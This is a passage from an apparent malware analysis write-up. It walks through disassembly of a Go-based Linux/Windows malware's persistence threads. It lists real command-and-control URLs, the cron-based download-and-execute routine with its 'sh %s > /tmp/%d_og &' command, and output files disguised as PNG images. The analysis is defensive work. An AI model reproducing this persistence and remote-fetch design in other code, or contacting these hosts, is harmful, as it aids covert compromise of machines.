<li><code>iam-lin-normal</code></li>
<li><code>iam-win-root</code></li>
<li><code>iam-win-normal</code></li>
</ul>
<p>The C2 server is accessed via HTTP. The <em>URL</em> uses, what appears to be, a
random path. C2 URLs found in the samples are:</p>
<ul>
<li><code>http://146.71.79.230/363A3EDC10A2930DVNICE/</code></li>
<li><code>http://185.181.10.234/E5DB0E07C3D7BE80V520/</code></li>
</ul>
<p>After this information has been collected, the main work function is executed.
The <em>main</em> worker function <code>start_dog</code> starts four <em>Go routines</em>:</p>
<ul>
<li><code>dog_protect_cc_thread</code></li>
<li><code>dog_protect_cron_thread</code></li>
<li><code>dog_protect_process_thread</code></li>
<li><code>dog_update_thread</code></li>
</ul>
<h2 id="dog_protect_cron_thread">dog_protect_cron_thread</h2>
<p>The <em>protect cron</em> function ensures that the persistence methods used by the
malware are still active. The malware includes both code logic for Windows and
Linux and will execute different functions depending on which operating system
is used on the infected machine. The <em>ASM</em> snippet below shows the two
branches.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316b2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316b7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316bb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316c5</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.lin_walk_cron</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316ca</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316cf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">arg_48h</span>], <span style="color:#66d9ef">al</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316d3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316d8</span>  <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x20</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316dc</span>  <span style="color:#66d9ef">ret</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316dd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316e2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316e6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316eb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006316f0</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.win_walk_cron</span>
</code></pre></div><h3 id="linux-cron-thread-functionality">Linux Cron Thread Functionality</h3>
<p>Persistence on Linux machines is achieved via cron entries. The malware
executes the shell command <code>crontab -l</code> and looks if the entry for the
<code>update.sh</code> file exists in the output. If the expected line is not part of the
output, the malware checks to see if the script file still exists. If it does,
it just reads to cron entry. Otherwise, it downloads it.</p>
<p>The script file is downloaded to a temporary file into the <code>/tmp</code> folder. The
snippet below shows how the filename is generated. The malware uses a random
number from including 0 to less than, excluding, 1000. The number is added
to the string shown in the snippet. If the number is <em>666</em>, the corresponding
filename will be <code>/tmp/kow666kd</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633284</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063328c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633291</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633296</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063329b</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063329e</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_88h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332a6</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.int</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332ad</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332b1</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332b6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332bb</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2E64</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332c0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332c5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332ca</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_88h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332d2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_90h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332da</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006c8e1f</span>] <span style="color:#75715e">; /tmp/kow%dkd
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006332e1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332e5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0xc</span> <span style="color:#75715e">; 12
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006332ee</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_88h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332f6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006332fb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633304</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063330d</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
</code></pre></div><p>The script is executed with the shell command seen in the snippet below.  The
output is written to a file in the <code>/tmp</code> folder. The output file is also using
a random number to produce a <em>random</em> filename. After it has been executed, the
script file is removed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633371</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x3e8</span> <span style="color:#75715e">; 1000
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633379</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063337e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633383</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633388</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063338b</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_98h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633393</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_a8h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063339b</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333a2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333a6</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_78h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333ab</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333b0</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2Estring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333b5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333ba</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333bf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_98h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333c7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_a0h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333cf</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.int</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333d6</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333da</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333df</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333e4</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2E64</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333e9</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333ee</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333f3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_a8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006333fb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_b0h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633403</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006cb999</span>] <span style="color:#75715e">; sh %s &gt; /tmp/%d_og &amp;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063340a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063340e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x14</span> <span style="color:#75715e">; 20
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633417</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_98h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063341f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633424</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063342d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633436</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063343b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633440</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_30h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633445</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633449</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063344e</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.lin_os_command_exec</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633453</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_68h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633458</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063345c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633461</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633466</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Remove</span>
</code></pre></div><h3 id="windows-cron-thread-functionality">Windows Cron Thread Functionality</h3>
<p>The way the malware executes commands on Windows is interesting. For each
command, at batch script is created. The output from the command is written to
a file which the malware reads. The assembly snippet below shows how the
malware creates a random filename for the out. A random number between 0 and
5000 is used for the &ldquo;randomness&rdquo; of the name. The file is written to the
<code>%TMP%</code> folder and masqueraded as a <em>PNG</em> file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dc2</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.TempDir</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dc7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dcc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dd0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_120h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dd8</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_128h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633de0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0x1388</span> <span style="color:#75715e">; 5000
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633de8</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633ded</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633df2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633df7</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633dfa</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_170h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e02</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_180h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e0a</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e11</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e15</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_120h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e1d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e22</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2Estring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e27</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e2c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e31</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_170h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e39</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_178h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e41</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.int</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e48</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e4c</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_60h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e51</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e56</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2E64</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e5b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e60</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e65</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_180h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e6d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_188h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e75</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006cadfe</span>] <span style="color:#75715e">; %s\JF90899%d266.png
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x00633e7c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633e80</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x13</span>
